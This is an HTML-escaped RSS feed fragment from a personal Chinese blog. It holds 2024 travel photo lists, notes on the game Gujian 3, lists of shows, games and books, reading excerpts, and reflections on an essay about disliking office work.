&lt;p&gt;碧海青天夜夜心&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/Picture_0880c08b0110abddf430.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/Picture_0880c08b0110abddb835.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/Picture_0880c08b0110abddbc31.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/Picture_0880c08b0110abdd9837.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-五月-内蒙古&#34;&gt;二〇二四 五月 内蒙古&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/b7c31310696dc749d7d9c1e3a03d26a7.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/d40764f534a752571b748cbe672760d6.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/39335c81e121d72346b24df3a08e1612.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/fb8a9f6cbff7997b14314b568100c5af.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/d4236f7e67638e768106d310117c3304.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-四月-ucaa-杉本博司无尽的刹那&#34;&gt;二〇二四 四月 UCAA-杉本博司：无尽的刹那&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/0dbf4b67ca12d3f1920d79b003100b04.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/747c2dd7084d7ce63315ac2c8f4b2ece.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/3ab338f988e24fbd450db06bac432c4c.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/724a05dc1714a8449d1f0a9188caca58.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/4c314ba668b34ef43e636b1b9f8c1a31.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-三月-奥林匹克森林公园牛街&#34;&gt;二〇二四 三月 奥林匹克森林公园/牛街&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/1b2b111acefe3ce8cde0b3aef7c7a0e6.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/ae26a5e8dee01f730f64ef8a6efc84d4.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/690eeb03a0695e500795e651a8653b82.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/10a680ce1d48aad36f8945325a79f141.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/724eda15c4c8518bdb8ac2c3156437ea.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/6a0b5606f82f12f22354280bd8883cb8.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/944bfa2f0aa6ab6333019a6d2e3c95a3.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/2b90d92d1d66d4d7ee7f55da32047949.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/86f58988920bc6a6b296508182569f6f.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/47bcc2c6b343cd65bfda7a950fdc2ef7.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/059dc3078aaacae6b0f4ede12b34991f.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-三月-沈阳&#34;&gt;二〇二四 三月 沈阳&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/5d8b1fccde5d72887ae677d10fd1561e.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/b115c4acf4d63d7c640a3f96b7059ce6.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/211df0bb4092db972ede1c31f44935e4.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/f9bc8c65d23ec8206b50d73016621fc6.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/10c869be88166ab22babe4065d68112c.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/ae202d7c76eb0afe7cf4e0bb1e26240e.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/3de7dd119ed863b760c41aea84c40d34.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/543b2b27cee3acb37b402ec11d222a3e.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/297ee16627adee022fbf9ffb652cf096.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/a983a04f28e2657e065278a86cb16650.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c446a3af0f6bd6ed2d9ca9346a284e4e.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-二月-南京苏州杭州青岛&#34;&gt;二〇二四 二月 南京苏州杭州青岛&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/4d04c0f76f195d77d0a0ffef51daa5e3.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/3d0ebd49e8d7b64ca29f76812f36aea5.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/dfa12977b83092e9882915ef865fe5f8.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/409d2ad60ef210b40c61a9cfb0f70c6b.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/4da1101a5be6025c0c0d00ac392a9308.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/2ece9cbbdc837446dfe8c5c97acda7a1.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/b4b9e92be1dc0440827b99be4811cbb2.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/81d0c043e3146185a1d2f17099b1e3ec.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/80bdffa4fbcf6455e0cecdf7271428ab.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/fbf2a0e0dac5765a7c7d591eedb2b48d.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/71bb2d216d7ad890a971e82e8f5e6fb2.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/ffa559cb8b1688689631664dcbbc8c6a.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/81e658606fe2183f0f9bcb9f5c8692d8.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/7418772fd7f6f6103d5d771356a119f0.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/f6ce193bbbd4526948ad637fcc0f7391.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/0b67742f689e58ea20a8dd2c975e42c4.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/a592eb730babda28cdec687db4757cbd.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/19ac822619bdc93a47246d0e9d26bfba.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/f226af13c27bfa8413e0a4b6df9263bb.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/dd07d064a84ad9899b4683cd4a079932.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/813daac4bb88458e63272ced44728124.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/797300d50b9439ed48b3b626abb5c056.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c3b475f78ec4c754dda20fa367dc9c68.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/90347354d8e54fe018846844d25a3d3f.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/e8733ffeacf9ce8261c43b33fe766966.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/7f4ebdbfe591aac62b86f3c36b08a8a5.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/44c867eadca4bbca78d75310039c27fe.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c16445d4d3b93f73727dc2c45c8fcc0d.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/7474efa949ad95e1bcbfd12a68cb7ac0.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/53caf5392d3d46dcf32ccd996256756c.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>《古剑奇谭三》小记(持续更新中)</title>
      <link>https://wander1ng.com/post/%E5%8F%A4%E5%89%91%E5%A5%87%E8%B0%AD%E4%B8%89%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Fri, 05 Jul 2024 11:26:32 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%8F%A4%E5%89%91%E5%A5%87%E8%B0%AD%E4%B8%89%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;p&gt;岑樱&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705124058.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;北洛&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705124116.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;乌衣国&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;神话中的燕子之国。宋张敦颐《六朝事迹．乌衣巷》:&amp;ldquo;王榭，金陵人，世以航海为业。一日，海中失船，泛一木登岸，见一翁一妪皆衣皂，引榭至所居，乃乌衣国也。以女妻之，既久，榭思归，复乘云轩泛海至其家，有二燕栖于梁上……来春，燕又飞来榭身上，有诗云:&amp;lsquo;昔日相逢冥数合，如今暌远是生离。来春纵有相思字，三月天南无雁飞。&amp;rsquo;&amp;ldquo;宋戴复古《燕》诗:&amp;ldquo;闻说乌衣国，低连海上村。&amp;ldquo;金庞铸《田器之燕子图》诗:&amp;ldquo;乌衣之国定何许，一双燕子能飞来。&amp;ldquo;后因以之为男女结合之地的典实。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705124105.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705124111.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>待看电影及剧集小记</title>
      <link>https://wander1ng.com/post/%E5%BE%85%E7%9C%8B%E7%94%B5%E5%BD%B1%E5%8F%8A%E5%89%A7%E9%9B%86%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Wed, 03 Jul 2024 10:28:44 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%BE%85%E7%9C%8B%E7%94%B5%E5%BD%B1%E5%8F%8A%E5%89%A7%E9%9B%86%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;h4 id=&#34;二二四年七月&#34;&gt;二〇二四年|七月&lt;/h4&gt;
&lt;p&gt;正在看&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《眷思量》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《人间世》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《边走边唱的女子》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《是的首相》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《权力的游戏》&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>待玩游戏小记</title>
      <link>https://wander1ng.com/post/%E5%BE%85%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Wed, 03 Jul 2024 10:27:42 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%BE%85%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;h4 id=&#34;二二四年七月&#34;&gt;二〇二四年|七月&lt;/h4&gt;
&lt;p&gt;正在玩&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《古剑奇谭三》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《烟火》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《赛博朋克2077》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《文明6》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《荒野大镖客2：救赎》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;期待ing&lt;/p&gt;
&lt;p&gt;&lt;code&gt;《黑神话：悟空》&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>待读书籍小记</title>
      <link>https://wander1ng.com/post/%E5%BE%85%E8%AF%BB%E4%B9%A6%E7%B1%8D%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Wed, 03 Jul 2024 10:20:30 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%BE%85%E8%AF%BB%E4%B9%A6%E7%B1%8D%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;h4 id=&#34;二二四年七月&#34;&gt;二〇二四年|七月&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;《莱博维茨的赞歌》&lt;/code&gt;for科幻读书会&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	“站住别动！”老头儿用嘶哑的声音吼道，“离我远点儿，你这怪物！我这里没有你要的东西！这里有奶酪，你可以拿走。想要肉的话，除了这把老骨头，我什么都没有。你要敢动，我就和你拼个鱼死网破！滚开！快滚！”
“等等——”修士刚说两个字就住了口。只有出于行善或礼貌才可以打破斋节期间禁言的规矩，情势所迫也能得到谅解，但主动打破沉默还是让修士有些紧张。
​	“我并非怪物，善良的蠢货。”修士用表示礼貌的称呼接着说道。他褪下了兜帽，露出修士发式，抬起手中的念珠：“这下您明白了吧？”
​	沉寂持续了几秒钟，老人一边像猫一样保持警惕，随时准备以命相搏，一边细细打量修士被晒出水疱的稚嫩脸颊——尽管他自己的老脸才是个天生的错误。沙漠边缘到处游荡着怪物，他们常常戴着兜帽、面具或穿着宽松的长袍来掩盖身体的缺陷。他们的畸形不仅限于身体，有的怪物甚至会把旅行者当作可以赖以为生的野味。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;​	尽管弗朗西斯因为摄水量不足而导致身体脱水，可一见到食物，口腔里一下子涌上了唾液。修士的目光被这递食物的手牢牢吸引住了，无法移开。刹那间，宇宙收缩了，悬浮不定的宇宙中心就在于这沾满沙土的珍馐——黑面包和白奶酪。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《永恒的终结》&lt;/code&gt;for科幻读书会&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《与罗摩相会》&lt;/code&gt;for科幻读书会&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《刘擎现代西方思想讲义》&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	着眼于分析、诊断和反思，什么样的思想观念塑造了现代社会的行动逻辑，构成了现代世界的复杂性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《这就是ChatGPT》&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	GPT的主要思路是通过生成获取世界模型的压缩表示——Ilya Sutskever&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;​	产生“有意义的人类语言”需要什么？过去，我们可能认为人类大脑必不可少。但现在我们知道，ChatGPT的神经网络也可以做得非常出色……我强烈怀疑ChatGPT的成功暗示了一个重要的“科学”事实：有意义的人类语言实际上比我们所知道的更加结构化、更加简单，最终可能以相当简单的规则来描述如何组织这样的语言。
​	语言是严肃思考、决策和沟通的工具。从孩子的成长过程来看，相比感知、行动，语言应该是智能中更难的任务。但ChatGPT很可能已经攻破了其中的密码，正如Wolfram说的“它也在某种意义上‘钻研’到了，不必考虑可能的不同措辞，就能‘以语义上有意义的方式组织语言’的地步”。这确实预示着未来我们通过计算语言或者其他表示方式，有可能进一步大幅提升整体的智能水平。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《艺术的力量》&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	伟大的艺术都有令人不悦的方面。美术馆中的安静肃穆可以欺骗你，令你相信杰出的艺术作品都是礼貌友好的事物，是抚慰人心、令人陶醉、引人入胜的图景，但是它们其实都是暴徒。无情，狡诈，最伟大的绘画作品简直是要一把按住你的脑袋，将你的沉着镇定彻底击碎，然后立刻开始重组你对真实世界的感知。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《我还能看到多少次满月升起》&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	因为不知死何时将至，我们仍将生命视为无穷无尽、取之不竭的源泉。然而，一生所遇之事也许就只发生那么几次。曾经左右过我们人生的童年回忆浮现在心头的时刻还能有多少次呢？也许还能有四五次。目睹满月升起的时刻又还能有多少次呢？或许最多还能有二十次。但人们总是深信这些机会将无穷无尽。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《念念远山》&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;《席德梅尔的回忆录》&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;翦商&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;古国时代：辽河文明、黄河文明、长江文明;&lt;/p&gt;
&lt;p&gt;辽河文明主要是红山文化牛河梁遗址;黄河文明主要是仰韶文化、大汶口文化、龙山文化、陶寺遗址、石峁遗址;长江文明主要是凌家滩文化、良渚文化、三星堆遗址;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;杀祭地点在戍嗣子的家宅或附近，操办和参加祭礼的是商朝贵族，给了死者一点宽待，但仍按照惯例烹食了很多被献祭的人，尤其是婴儿和幼儿。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;罗马人后来皈依了基督教，传统的阿兹特克宗教被西班牙殖民者的天主教所取代，殷商则与之不同：周灭商后，人祭被周人消除，但周人并未开创一种新的宗教，而是采用世俗的人文主义立场，与极端宗教行为保持距离，不允许其干预现实生活，所谓“敬鬼神而远之”。这奠定了后世中国的文化基础。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;人祭主要表现为以下三种形式： 一，把人夯筑在地基内，用作建筑物的奠基，可称之为“人奠基”。其原理可能是把人奉献给土地之神，用以交换神对建筑物的护佑，以及通过施展巫术，被杀者可能也会变成守护建筑之鬼。 二，把人作为食物或仆役献祭给神或祖先之灵，这是狭义的“人祭”。 三，把人作为殉葬品埋在主人的墓穴内，可称之为“人殉”。其原理可能是当时的人们认为尊贵的人在死后会变为神灵，所以在去往神界的旅途中要给他（她）带上一些仆役和食物。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>《格子间的生与死：当我们厌恶工作》小记</title>
      <link>https://wander1ng.com/post/%E6%A0%BC%E5%AD%90%E9%97%B4%E7%9A%84%E7%94%9F%E4%B8%8E%E6%AD%BB%E5%BD%93%E6%88%91%E4%BB%AC%E5%8E%8C%E6%81%B6%E5%B7%A5%E4%BD%9C%E6%9C%AD%E8%AE%B0/</link>
      <pubDate>Mon, 01 Jul 2024 23:43:17 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E6%A0%BC%E5%AD%90%E9%97%B4%E7%9A%84%E7%94%9F%E4%B8%8E%E6%AD%BB%E5%BD%93%E6%88%91%E4%BB%AC%E5%8E%8C%E6%81%B6%E5%B7%A5%E4%BD%9C%E6%9C%AD%E8%AE%B0/</guid>
      <description>&lt;p&gt;《格子间的生与死：当我们厌恶工作》是语雀公众号推送的一篇文章，部分观点挺触动我的，贴上链接&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://mp.weixin.qq.com/s/6UxbWnE04wOpv56Ub0p7xw&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;作者主要分成了两个方面，一方面是解构当下大部分人工作感到痛苦的原因：a)从精神层面来说，高薪越来越难以带来快乐。b)从身体层面来说，空间桎梏让人孤独。随后在另一方面尝试提出了解决办法：a)表达，阅读，解明，构建。b)将金钱价值具象化。c)建立分布式的情感系统。d)把工作作为手段而非目的。&lt;/p&gt;
&lt;p&gt;作者把&lt;code&gt;高薪越来越难带来快乐&lt;/code&gt;归纳为三个原因&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;金钱边际效应的递减；&lt;/li&gt;
&lt;li&gt;长期主义的神话逐渐成为谎言；&lt;/li&gt;
&lt;li&gt;金钱锚定物的缺失；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;金钱边际效应的递减，当一个人存款从零到十万时，带来的快是最大的。而从十万到二十万、从二十万到四十万，数字的变化带来的快乐已经很小了。这方面我已经感受到了，还记得第一次拿到正式工资时的快乐，到账的不是钱而是闪闪发光的自由，以及社会对自身价值的认可。如今和同事调侃起工资，一般都称作&lt;code&gt;窝囊费&lt;/code&gt;。&lt;/p&gt;
